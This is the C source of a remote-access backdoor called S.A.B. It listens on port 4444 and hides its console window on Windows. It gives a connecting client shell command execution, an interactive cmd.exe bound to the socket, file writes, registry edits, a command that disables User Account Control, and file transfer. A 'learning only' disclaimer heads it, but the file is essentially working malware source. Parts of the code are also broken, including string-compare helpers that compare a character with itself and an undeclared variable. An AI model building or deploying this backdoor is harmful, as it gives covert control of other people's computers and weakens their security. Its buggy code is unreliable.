/*
 ***************************************************
 * S.A.B.  -  Simple Active Backdoor for telnet.
 * by Philip "5n4k3" Simonson
 ***************************************************
 * Do NOT use for malicious activity. This was
 * created simply to learn from. This isn't very
 * good, so I wouldn't recommend using for
 * "cracking".
 ***************************************************
 */

#if defined(_WIN32) || (_WIN64)
	#include <winsock2.h>
	#include <windows.h>
#else
	#include <sys/socket.h>
	#include <arpa/inet.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <time.h>
#include <ctype.h>
#include <errno.h>
#include <unistd.h>

#define MY_PORT 4444
#define FILE_PORT 4545
#define VERSION_NUMBER "v0.04"

#define SAB_ASCII "\r\n"\
"\r\n"\
"\r\n"\
"             ^$##########$-                                                          -$#####$-                   \r\n"\
"           ^$##############-                          ^$$-                       ^$###########$-                 \r\n"\
"          ^#################-                        ^####                       ###############-                \r\n"\
"          #####+        |####-                      ^#####|                      #####=     =####|               \r\n"\
"         -###+           |####                      #######-                    ^###+        |####-              \r\n"\
"         ###=             |###                     ^###=####                    ####           ####              \r\n"\
"        -###               |#+                    ^#### |###                    ###+           |###-             \r\n"\
"        ###=                                      ####+  ###                    ###             ####             \r\n"\
"        ###                                      ^###+   ###                    ###             |###             \r\n"\
"        ###-                                     ####    ###|                   ###              ###             \r\n"\
"        ####-                                    ###+    +###                   ###              ###             \r\n"\
"        |####-                                  -###      ###                   ###              ###             \r\n"\
"         |####-                                 ###=      ###                   ###             -###             \r\n"\
"          |#####$-                             -###       ###                   ###             ###=             \r\n"\
"           |######$-                           ###=       ###                   ###            |###              \r\n"\
"             =######$-                        ^###        ###                   ###           -###=              \r\n"\
"               |#######$-                     ####        ###                   ###          -###O               \r\n"\
"                  =######-                    ###+        ###-                  ###    -$########                \r\n"\
"                    =#####-                  -################                  ### |$###########-               \r\n"\
"                      |####                 ^#################                  ##################-              \r\n"\
"      ^O-              |###-                ##################                  ###################-             \r\n"\
"      ###               ####               ^###+           ###                  ########=      |####-            \r\n"\
"      ###               |###               ####            ###                  ###             |####            \r\n"\
"      ###                ###              ^###+            ###                  ###              |###            \r\n"\
"      ###$-              ###             ^####             ###|                ^###               ###            \r\n"\
"      +####$-           |###             ####+             +###                ####              ^###            \r\n"\
"       =######$-     -$####=            ^###+               ###                ###+              ####            \r\n"\
"         =################O      -|     ####                ###                ###              -###+            \r\n"\
"          |##############=       O#     ###+                ###                ###             ^###=             \r\n"\
"             |########=          O#     |#+                 ###-     +$|       ###             ####              \r\n"\
"                                                            ####     O##       ###           ^$###+     ^$$-     \r\n"\
"                                                            |###              ^###        -$#####=      $###     \r\n"\
"                                                             |#+              ##################=       |##+     \r\n"\
"                                                                              #################+                 \r\n"\
"                                                                              |############=                     \r\n"\
"\r\n"\
"\r\n"

#define UPPER_CHARS "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
#define NUMBERS "0123456789"

int pstrcmp(p,p2)
	char *const p;
	const char *p2;
{
	char *tmp;
	for(tmp=p; *tmp != 0 && tmp != p+1; ++tmp)
		if(*tmp != *tmp)
			return(*tmp-*tmp);
	return(0);
}

/* pstricmp() - *nix doesn't have stricmp like windows.
 */
int pstricmp(p,p2)
	char *const p;
	const char *p2;
{
	char *tmp;
	for(tmp=p; *tmp != 0 && tmp != p+1; ++tmp)
		if(tolower(*tmp) != tolower(*tmp))
			return(*tmp-*tmp);
	return(0);
}

/* main() - entry point for program.
 */
int main(argc,argv)
	int argc;
	char **argv;
{
	void hide_wnd();
	int upload_file();
	void handle_clients();
	void pass_grab();
#if defined(_WIN32) || (_WIN64)
	SOCKET serverfd,clientfd;
#else
	int serverfd,clientfd;
#endif
	struct sockaddr_in server,client;
	char buf[BUFSIZ];
	char msg[BUFSIZ];
	char alpha[27];
	char num[11];
	char password[9];
	int i,j,clientlen;
	char kill;

#if defined(_WIN32) || (_WIN64)
	WSADATA wsaData;
	ZeroMemory(&wsaData,sizeof(wsaData));
	if(WSAStartup(MAKEWORD(2,2),&wsaData) != 0) {
		fprintf(stderr,"Error: Cannot startup winsock [ERROR CODE: %d]\n",WSAGetLastError());
		return(1);
	}
	ZeroMemory(buf,sizeof(buf));
	ZeroMemory(msg,sizeof(msg));
	hide_wnd(1); /* switch this 1 into a 0 for showing the window */
#endif

	srand((unsigned int)time(0));
	memset(alpha,0,27);
	memset(num,0,11);
	memcpy(alpha,UPPER_CHARS,26);
	memcpy(num,NUMBERS,10);
	memset(password,0,9);

	i = 0;
	while(i < 8) {
		j = rand()%2;
		switch(j) {
			case 0:
				password[i] = alpha[rand()%26];
			break;
			case 1:
				password[i] = num[rand()%10];
			break;
			default:
				break;
		}
		++i;
	}
	++i;
	password[i] = 0;

	if(argc < 2) {
		errno = 0;
#if defined(_WIN32) || (_WIN64)
		if((serverfd = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0)) < 0) {
			WSACleanup();
#else
		if((serverfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {
#endif
			fprintf(stderr,"Error: %s\n",strerror(errno));
			return(-1);
		}

#if defined(_WIN32) || (_WIN64)
		ZeroMemory(&server,sizeof(server));
#else
		bzero(&server,sizeof(server));
		bzero(buf,sizeof(buf));
		bzero(msg,sizeof(msg));
#endif
		server.sin_family = AF_INET;
		server.sin_port = htons(MY_PORT);
		server.sin_addr.s_addr = htonl(INADDR_ANY);

		errno = 0;
		if(bind(serverfd,(struct sockaddr*)&server,sizeof(server)) < 0) {
			fprintf(stderr,"Error: %s\n",strerror(errno));
#if defined(_WIN32) || (_WIN64)
			closesocket(serverfd);
			WSACleanup();
#else
			close(serverfd);
#endif
			return(-1);
		}
		printf("%s bound to port [%d].\n",inet_ntoa(server.sin_addr),MY_PORT);

		errno = 0;
		if(listen(serverfd,1) < 0) {
			fprintf(stderr,"Error: %s\n",strerror(errno));
#if defined(_WIN32) || (_WIN64)
			closesocket(serverfd);
			WSACleanup();
#else
			close(serverfd);
#endif
			return(-1);
		}

		kill = 0;
		clientlen = sizeof(client);
		while(clientfd = accept(serverfd,(struct sockaddr*)&client,&clientlen) > 0) {
			printf("%s:%d client connected.\n",inet_ntoa(client.sin_addr),
				MY_PORT);
			memset(msg,0,sizeof(msg));
			sprintf(msg,"SABD - Simple Active Backdoor %s\r\nType 'help' to find out what you can do...\r\n",VERSION_NUMBER);
			if(send(clientfd,SAB_ASCII,strlen(SAB_ASCII),0) != strlen(SAB_ASCII)) {
				puts("Couldn't send intro text ascii art.");
			}
			if(send(clientfd,msg,strlen(msg),0) != strlen(msg)) {
				puts("Couldn't send intro text.");
			}
			kill = 0;
#if defined(_WIN32) || (_WIN64)
			pass_grab(clientfd,inet_ntoa(client.sin_addr),password,&kill);
			if(closesocket(clientfd) == 0) {
				printf("%s:%d client disconnected.\n",
					inet_ntoa(client.sin_addr),
					MY_PORT);
			}
#else
			pass_grab(&clientfd,inet_ntoa(client.sin_addr),password,&kill);
			if(close(clientfd) == 0) {
				printf("%s:%d client disconnected.\n",
					inet_ntoa(client.sin_addr),
					MY_PORT);
			}
#endif
			if(kill == 1) break;
		}
		if(clientfd == 0)
			puts("Client disconnected!");
		else
			puts("Client connection failed!");

#if defined(_WIN32) || (_WIN64)
		closesocket(serverfd);
		WSACleanup();
#else
		close(serverfd);
#endif
	} else if(argc == 5 && argv[1][0] == '-' && (argv[1][1] == 'u' || argv[1][1] == 'd')) {
		return(upload_file(argv[1],argv[2],argv[3],atoi(argv[4])));
	} else {
		printf("Usage: %s [-u] <IP-address> <filename.ext> <isserver>\n"
			"isserver - if 0 then its client anything else is server.\n",argv[0]);
	}
	return 0;
}

/* hide_wnd() - In windows, hides the main console window.
 */
#if defined(_WIN32) || (_WIN64)
void hide_wnd(a)
	char a;
{
	HWND hWndConsole;
	hWndConsole = GetConsoleWindow();
	if(hWndConsole) {
		if(a)
			SetWindowPos(hWndConsole,HWND_TOP,0,0,CW_USEDEFAULT,CW_USEDEFAULT,SWP_HIDEWINDOW);
		else
			SetWindowPos(hWndConsole,HWND_TOP,0,0,CW_USEDEFAULT,CW_USEDEFAULT,SWP_SHOWWINDOW);
	}
}
#endif

/* strip_cmd() - strips of carrage returns and line feeds on commands.
 */
void strip_cmd(cmd)
	char *cmd;
{
	char tmp[strlen(cmd)+1];
	int i;

	memset(tmp,0,strlen(cmd)+1);
	for(i=0; i<strlen(cmd)+1; ++i) {
		if(*(cmd+i) == 0x0A || *(cmd+i) == 0x0D) {
			continue;
		}
		tmp[i] = *(cmd+i);
	}
	tmp[i] = 0;
	memset(cmd,0,strlen(tmp)+1);
	for(i=0; i<strlen(tmp)+1; ++i) {
		*(cmd+i) = tmp[i];
	}
}

/* pass_grab() - handle grabbing password from client.
 */
void pass_grab(socket,address,password,kill)
#if defined(_WIN32) || (_WIN64)
	SOCKET socket;
#else
	int *socket;
#endif
	const char *address;
	const char *password;
	int *kill;
{
	void handle_clients();
	void get_cmd();
	FILE *file;
	char msg[256];
	char buf[9];
	int i,pass;

	pass = 0;
	memset(msg,0,sizeof(msg));
	sprintf(msg,"Passcode is %s.\r\n",password);
	for(i = 0; i < 3; ++i) {
#if defined(_WIN32) || (_WIN64)

		send(socket,msg,strlen(msg),0);
		send(socket,"Password: ",10,0);
#else
		send(*socket,msg,strlen(msg),0);
		send(*socket,"Password: ",10,0);
#endif
		get_cmd(socket,address,buf,sizeof(buf));
		if(pstrcmp(password,buf) == 0) {
			pass = 1;
			break;
		} else {
#if defined(_WIN32) || (_WIN64)
			send(socket,"Wrong password.\r\n",17,0);
#else
			send(*socket,"Wrong password.\r\n",17,0);
#endif
		}
	}
	if(pass == 0)
		return;
	handle_clients(socket,address,kill);
}

/* handle_clients() - main function for handling clients.
 */
void handle_clients(socket,address,kill)
#if defined(_WIN32) || (_WIN64)
	SOCKET socket;
#else
	int *socket;
#endif
	const char *address;
	int *kill;
{
	void editor();
	void do_cmdprompt();
	void handle_commands();
	void get_cmd();
	void mod_reg();
	char msg[256];
	char cmd[128];
	char c;

	recv(socket,&c,1,0);

	do {
		memset(msg,0,sizeof(msg));
#if defined(_WIN32) || (_WIN64)
		send(socket,"CMD >> ",7,0);
#else
		send(*socket,"CMD >> ",7,0);
#endif
		get_cmd(socket,address,cmd,sizeof(cmd));

		if(pstricmp(cmd,"exit") == 0) {			/* exit - Exit telnet app, leave backdoor
								   running. */
			break;
		} else if(pstricmp(cmd,"help") == 0) {		/* help - Display help message */
			sprintf(msg,"Commands: [exit,cmd,prompt,edit,kill_me,reg_mod,uac,help]\r\n");
#if defined(_WIN32) || (_WIN64)
			send(socket,msg,strlen(msg),0);
#else
			send(*socket,msg,strlen(msg),0);
#endif
		} else if(pstricmp(cmd,"edit") == 0) {
#if defined(_WIN32) || (_WIN64)
			editor(socket,address);
#else
			editor(*socket,address);
#endif
		} else if(pstricmp(cmd,"cmd") == 0) {		/* cmd - Execute a single command remotely. */
			handle_commands(socket,address);
		} else if(pstricmp(cmd,"kill_me") == 0) {		/* kill_me - Quit the backdoor remotely. */
			*kill = 1;
			break;
		} else if(pstricmp(cmd,"prompt") == 0) {		/* prompt - Run a windows command prompt
										   inside of this telnet server. */
#if defined(_WIN32) || (_WIN64)
			do_cmdprompt(socket);
#else
			sprintf(msg,"Not yet implement for *nix systems.\r\n");
			send(*socket,msg,strlen(msg),0);
#endif
		} else if(pstricmp(cmd,"reg_mod") == 0) {		/* reg_mod - Modify registry values */
#if defined(_WIN32) || (_WIN64)
			mod_reg(socket,address);
#else
			sprintf(msg,"Windows only command.. no reg.exe in linux/mac!\r\n");
			send(*socket,msg,strlen(msg),0);
#endif
		} else if(pstricmp(cmd,"uac") == 0) {		/* uac - User Account Control */
#if defined(_WIN32) || (_WIN64)
			send(socket,"Turn (Off/On)? ",15,0);
			get_cmd(socket,address,cmd,sizeof(cmd));
			if(stricmp(cmd,"Off") == 0) {
				sprintf(msg,"C:\\Windows\\System32\\cmd.exe /c \"start reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 0x00000000 /f\"");
				system(msg);
			} else if(stricmp(cmd,"On") == 0) {
				sprintf(msg,"C:\\Windows\\System32\\cmd.exe /c \"start reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Polices\\System /v EnableLUA /t REG_DWORD /d 0x00000001 /f\"");
				system(msg);
			} else {
				ZeroMemory(msg,sizeof(msg));
				sprintf(msg,"Invalid entry.\r\n");
				send(socket,msg,strlen(msg),0);
			}
#else
			sprintf(msg,"Command only available in windows.\r\n");
			send(*socket,msg,strlen(msg),0);
#endif
		} else {
			sprintf(msg,"Unknown command.\r\n");
#if defined(_WIN32) || (_WIN64)
			send(socket,msg,strlen(msg),0);
#else
			send(*socket,msg,strlen(msg),0);
#endif
		}
	} while(1);
}

/* do_cmdprompt() - Windows only function, create cmd.exe process
 * and write to telnet session.
 */
#if defined(_WIN32) || (_WIN64)
void do_cmdprompt(socket)
	SOCKET socket;
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	/* Setup Startup Info for Process */
	ZeroMemory(&si,sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)socket;
	si.hStdOutput = (HANDLE)socket;
	si.hStdError = (HANDLE)socket;

	/* Create process and wait for it to end */
	if(CreateProcess(NULL,"C:\\Windows\\System32\\cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi) != 0) {
		WaitForSingleObject(pi.hProcess,INFINITE);
	}
}
#endif

/* getln_remote() - get line network
 */
int getln_remote(socket,str,size)
#if defined(_WIN32) || (_WIN64)
	SOCKET socket;
#else
	int *socket;
#endif
	char str[];
	size_t size;
{
	int i,j;
	char c;

	j = 0;
	memset(str,0,sizeof(size));
#if defined(_WIN32) || (_WIN64)
	for(i=0; recv(socket,&c,1,0) && c != '`' && c != '\n'; ++i)
#else
	for(i=0; recv(*socket,&c,1,0) && c != '`' && c != '\n'; ++i)
#endif
		if(i < size-2) {
			if(c == 0x08) {
				--i;
				str[i] = 0;
				++i;
				send(socket," \b",2,0);
				continue;
			}
			str[i] = c;
			++j;
		}
	if(c == 0x0D) {
		str[i] = c;
		++i;
		++j;
	}
	++i;
	str[i] = 0;
	return(j);
}

/* editor() - built-in editor for telnet.
 */
void editor(socket,address)
#if defined(_WIN32) || (_WIN64)
	SOCKET socket;
#else
	int *socket;
#endif
	const char *address;
{
	void get_cmd();
	FILE *file;
	char buf[256];

#if defined(_WIN32) || (_WIN64)
	send(socket,"Enter filename: ",16,0);
#else
	send(*socket,"Enter filename: ",16,0);
#endif
	get_cmd(socket,address,buf,sizeof(buf));
	if((file = fopen(buf,"wt")) == NULL) {
#if defined(_WIN32) || (_WIN64)
		send(socket,"Error: opening file.\r\n",22,0);
#else
		send(*socket,"Error: opening file.\r\n",22,0);
#endif
		return;
	}

#if defined(_WIN32) || (_WIN64)
	send(socket,"Type a '`' on new line to write file...\r\n",41,0);
	send(socket,"> ",2,0);
	while(getln_remote(socket,buf,sizeof(buf)) > 0) {
#else
	send(*socket,"Type a '`' on new line to write file...\r\n",41,0);
	send(*socket,"> ",2,0);
	while((bytes = getln_remote(socket,buf,sizeof(buf))) > 0) {
#endif
		fprintf(file,"%s",buf);
#if defined(_WIN32) || (_WIN64)
		send(socket,"> ",2,0);
#else
		send(*socket,"> ",2,0);
#endif
	}
	fclose(file);
#if defined(_WIN32) || (_WIN64)
	send(socket,"File written.\r\n",15,0);
#else
	send(*socket,"File written.\r\n",15,0);
#endif
}

/* handle_commands() - main function for handling all commands
 * in the main handle_clients() function.
 */
void handle_commands(socket,address)
#if defined(_WIN32) || (_WIN64)
	SOCKET socket;
#else
	int *socket;
#endif
	const char *address;
{
	void get_cmd();
	char cmd[128];

#if defined(_WIN32) || (_WIN64)
	send(socket,"Enter command: ",15,0);
	get_cmd(socket,address,cmd,sizeof(cmd));
#else
	send(*socket,"Enter command: ",15,0);
	get_cmd(*socket,address,cmd,sizeof(cmd));
#endif
	system(cmd);
}

void mod_reg(socket,address)
#if defined(_WIN32) || (_WIN64)
	SOCKET socket;
#else
	int *socket;
#endif
	const char *address;
{
	void get_cmd();
	char msg[256];
	char cmd[256];
	char stuff[4][256];
	char regcmd[1024];
	int i;

	memset(msg,0,sizeof(msg));
	sprintf(msg,"           ***********************\r\n"
		"           *** MODIFY REGISTRY ***\r\n"
		"           ***********************\r\n\r\n");
#if defined(_WIN32) || (_WIN64)
	send(socket,msg,strlen(msg),0);
#else
	send(*socket,msg,strlen(msg),0);
#endif
	for(i=0; i<4; ++i)
		memset(stuff[i],0,256);
	/* Get the registry key */
	memset(msg,0,sizeof(msg));
	memset(cmd,0,sizeof(cmd));
	sprintf(msg,"Enter key (HKLM,HKCU,...): ");
#if defined(_WIN32) || (_WIN64)
	send(socket,msg,strlen(msg),0);
#else
	send(*socket,msg,strlen(msg),0);
#endif
	get_cmd(socket,address,cmd,sizeof(cmd));
	strncpy(stuff[0],cmd,sizeof(stuff[0]));

	/* Get the registry type */
	memset(msg,0,sizeof(msg));
	memset(cmd,0,sizeof(cmd));
	sprintf(msg,"Enter type (Path,Data,MRU): ");
#if defined(_WIN32) || (_WIN64)
	send(socket,msg,strlen(msg),0);
#else
	send(*socket,msg,strlen(msg),0);
#endif
	get_cmd(socket,address,cmd,sizeof(cmd));
	strncpy(stuff[1],cmd,sizeof(stuff[1]));

	/* Get the registry value type */
	memset(msg,0,sizeof(msg));
	memset(cmd,0,sizeof(cmd));
	sprintf(msg,"Enter value type (REG_MULTI_SZ,REG_EXPAND_SZ,REG_BINARY): ");
#if defined(_WIN32) || (_WIN64)
	send(socket,msg,strlen(msg),0);
#else
	send(*socket,msg,strlen(msg),0);
#endif
	get_cmd(socket,address,cmd,sizeof(cmd));
	strncpy(stuff[2],cmd,sizeof(stuff[2]));

	/* Get the registry value of data */
	memset(msg,0,sizeof(msg));
	memset(cmd,0,sizeof(cmd));
	sprintf(msg,"Enter value (value of data): ");
#if defined(_WIN32) || (_WIN64)
	send(socket,msg,strlen(msg),0);
#else
	send(*socket,msg,strlen(msg),0);
#endif
	get_cmd(socket,address,cmd,sizeof(cmd));
	strncpy(stuff[3],cmd,sizeof(stuff[3]));

	/* modify registry value */
	memset(regcmd,0,sizeof(regcmd));
	sprintf(regcmd,"start cmd /k \"reg ADD %s /v %s /t %s /d %s /f\"",
		stuff[0], stuff[1], stuff[2], stuff[3]);
	system(regcmd);
}

void get_cmd(socket,address,buf,size)
#if defined(_WIN32) || (_WIN64)
	SOCKET socket;
#else
	int *socket;
#endif
	const char *address;
	char buf[];
	size_t size;
{
	char msg[256];
	char c;
	int i;

	memset(msg,0,sizeof(msg));
	memset(buf,0,size);
	i = 0;
	errno = 0;
#if defined(_WIN32) || (_WIN64)
	while(recv(socket,&c,1,0)) {
#else
	while(recv(*socket,&c,1,0)) {
#endif
		if(errno == EBADF || errno == EIO || errno == EOVERFLOW) {
			sprintf(msg,"Error: receiving from %s.\r\n",
				address);
#if defined(_WIN32) || (_WIN64)
			send(socket,msg,strlen(msg),0);
#else
			send(*socket,msg,strlen(msg),0);
#endif
			goto error;
		}
		if(c == 0x0A) {
			break;
		} else if(c == 0x08) {
			if(i > 0) {
				buf[i] = 0;
				--i;
#if defined(_WIN32) || (_WIN64)
				send(socket," \b",2,0);
#else
				send(*socket," \b",2,0);
#endif
			}
		} else {
			if(i < size-1) {
				buf[i] = c;
				++i;
			} else {
				break;
			}
		}
	}
	strip_cmd(buf);

error:
	return;
}

int upload_file(load,address,filename,isserver)
	const char *load;
	const char *address;
	const char *filename;
	char isserver;
{
	int sockfd,clientfd;
	size_t bytesRead,bytesWritten;
	struct sockaddr_in server;
	struct sockaddr_in client;
	FILE *file;
	char curdir[1024];
	char buf[512];

	if((load == NULL || address == NULL || filename == NULL) || (isserver < 0 && isserver > 1)) {
		puts("Error one of the function parameters is incorrect.");
		return(2);
	}

	if((sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {
		perror("socket()");
#if defined(_WIN32) || (_WIN64)
		WSACleanup();
#endif
		return(1);
	}

#if defined(_WIN32) || (_WIN64)
	ZeroMemory(&server,sizeof(server));
	ZeroMemory(&client,sizeof(client));
#else
	bzero(&server,sizeof(server));
	bzero(&client,sizeof(client));
#endif
	if(isserver) {
		server.sin_family = AF_INET;
		server.sin_port = htons(FILE_PORT);
		server.sin_addr.s_addr = inet_addr(address);

		if(bind(sockfd,(struct sockaddr*)&server,sizeof(server)) < 0) {
			perror("bind()");
#if defined(_WIN32) || (_WIN64)
			closesocket(sockfd);
			WSACleanup();
#else
			close(sockfd);
#endif
			return(-1);
		}
		puts("Socket created.");

		if(listen(sockfd,1) < 0) {
			perror("bind()");
#if defined(_WIN32) || (_WIN64)
			closesocket(sockfd);
			WSACleanup();
#else
			close(sockfd);
#endif
			return(-1);
		}
		puts("Listening...");

		if((clientfd = accept(sockfd,(struct sockaddr*)NULL,NULL)) < 0) {
			puts("Error: Cannot accept client connection sorry :(");
#if defined(_WIN32) || (_WIN64)
			closesocket(sockfd);
			WSACleanup();
#else
			close(sockfd);
#endif
			return(-1);
		}
		puts("Connection Established");

		if(load[1] == 'u') {
			if(getcwd(curdir,sizeof(curdir)) == NULL) {
				perror("getcwd()");
#if defined(_WIN32) || (_WIN64)
				closesocket(clientfd);
				closesocket(sockfd);
				WSACleanup();
#else
				close(clientfd);
				close(sockfd);
#endif
				return(-1);
			}
			strncat(curdir,filename,sizeof(curdir));

			if((file = fopen(curdir,"wb")) == NULL) {
#if defined(_WIN32) || (_WIN64)
				closesocket(clientfd);
				closesocket(sockfd);
				WSACleanup();
#else
				close(clientfd);
				close(sockfd);
#endif
				return(-1);
			}

			printf("Receiving file: %s\n",curdir);
			while((bytesRead = recv(clientfd,buf,sizeof(buf),0))) {
				bytesWritten = fwrite(buf,1,bytesRead,file);
				if(bytesWritten < 0) {
					puts("Error receiving file.");
					break;
				}
			}
		} else if(load[1] == 'd') {
			if(getcwd(curdir,sizeof(curdir)) == NULL) {
				perror("getcwd()");
#if defined(_WIN32) || (_WIN64)
				closesocket(clientfd);
				closesocket(sockfd);
				WSACleanup();
#else
				close(clientfd);
				close(sockfd);
#endif
				return(-1);
			}
			strncat(curdir,filename,sizeof(curdir));

			if((file = fopen(curdir,"rb")) == NULL) {
#if defined(_WIN32) || (_WIN64)
				closesocket(clientfd);
				closesocket(sockfd);
				WSACleanup();
#else
				close(clientfd);
				close(sockfd);
#endif
				return(-1);
			}

			printf("Transfering file: %s\n",curdir);
			while((bytesRead = fread(buf,1,sizeof(buf),file))) {
				bytesWritten = send(clientfd,buf,bytesRead,0);
				if(bytesWritten < 0) {
					puts("Error sending file.");
					break;
				}
			}
		}
		if(bytesRead == 0) {
			puts("Transfer complete.");
		}
		fclose(file);
	} else {
		server.sin_family = AF_INET;
		server.sin_port = htons(FILE_PORT);
		server.sin_addr.s_addr = inet_addr(address);

		if(connect(sockfd,(struct sockaddr*)&server,sizeof(server)) < 0) {
			puts("Error: Cannot connect to server sorry :(");
#if defined(_WIN32) || (_WIN64)
			closesocket(sockfd);
			WSACleanup();
#else
			close(sockfd);
#endif
			return(-1);
		}
		puts("Connection Established");

		if(load[1] == 'u') {
			if(getcwd(curdir,sizeof(curdir)) == NULL) {
				perror("getcwd()");
#if defined(_WIN32) || (_WIN64)
				closesocket(sockfd);
				WSACleanup();
#else
				close(sockfd);
#endif
				return(-1);
			}
			strncat(curdir,filename,sizeof(curdir));

			if((file = fopen(curdir,"rb")) == NULL) {
				printf("Error: Cannot open file %s.\n",curdir);
#if defined(_WIN32) || (_WIN64)
				closesocket(sockfd);
				WSACleanup();
#else
				close(sockfd);
#endif
				return(-1);
			}

			printf("Transfering file: %s\n",curdir);
			while((bytesRead = fread(buf,1,sizeof(buf),file))) {
				bytesWritten = send(sockfd,buf,bytesRead,0);
				if(bytesWritten < 0) {
					puts("Error sending file.");
					break;
				}
			}
		} else if(load[1] == 'd') {
			if(getcwd(curdir,sizeof(curdir)) == NULL) {
				perror("getcwd()");
#if defined(_WIN32) || (_WIN64)
				closesocket(sockfd);
				WSACleanup();
#else
				close(sockfd);
#endif
				return(-1);
			}
			strncat(curdir,filename,sizeof(curdir));

			if((file = fopen(curdir,"wb")) == NULL) {
				printf("Error: Cannot open file %s.\n",curdir);
#if defined(_WIN32) || (_WIN64)
				closesocket(sockfd);
				WSACleanup();
#else
				close(sockfd);
#endif
				return(-1);
			}

			printf("Receiving file: %s\n",curdir);
			while((bytesRead = recv(sockfd,buf,sizeof(buf),0))) {
				bytesWritten = fwrite(buf,1,bytesRead,file);
				if(bytesWritten < 0) {
					puts("Error receiving file.");
					break;
				}
			}
		}
		if(bytesRead == 0) {
			puts("Transfer complete.");
		}
		fclose(file);

#if defined(_WIN32) || (_WIN64)
		closesocket(sockfd);
		WSACleanup();
#else
		close(sockfd);
#endif
		return(0);
	}

#if defined(_WIN32) || (_WIN64)
	closesocket(clientfd);
	closesocket(sockfd);
	WSACleanup();
#else
	close(clientfd);
	close(sockfd);
#endif
	return(0);
}
